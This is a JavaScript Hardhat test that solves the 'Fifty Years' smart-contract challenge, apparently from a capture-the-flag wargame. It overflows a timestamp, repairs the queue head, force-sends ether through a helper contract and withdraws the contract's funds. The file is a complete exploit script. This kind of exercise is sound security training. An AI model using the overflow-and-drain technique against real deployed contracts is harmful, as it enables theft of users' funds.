import { ethers } from "hardhat";
import { expect } from "chai";
import { utils } from "ethers";


describe("fiftyyears", function() {
    it("should solve the fifty years challenge", async function() {
        this.timeout(0);

        const TARGET_ADDR = "0x604Cb8812a868Ac87002cE9176e810E92ff42F11";

        // print balance
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));
        
        // attach to target contract
        const factory = await ethers.getContractFactory("FiftyYearsChallenge");
        const targetCont = factory.attach(TARGET_ADDR);

        // overflow timestamp
        const DAY_SECONDS = 24 * 60 * 60;
        let time_overflow = ethers.BigNumber.from(2).pow(256).sub(DAY_SECONDS);
        let tx = await targetCont.upsert(1, time_overflow, { value: 1 });
        await tx.wait();
        console.log(tx);

        // fix head
        tx = await targetCont.upsert(2, 0, { value: 2, gasLimit: 1e5 });
        await tx.wait();
        console.log(tx);
        
        // deploy force send ether contract
        let attackerFactory = await ethers.getContractFactory("RetirementFundProxy");
        let attackerCont = await attackerFactory.deploy();
        tx = await attackerCont.attack(targetCont.address, { value: utils.parseUnits("2", "wei")});
        await tx.wait();
        console.log(tx);

        // withdraw funds
        tx = await targetCont.withdraw('2');
        await tx.wait();
        console.log(tx); 
       
        // check isComplete
        let isComplete = await targetCont.isComplete(); 
        expect(isComplete).to.be.true;
    });
});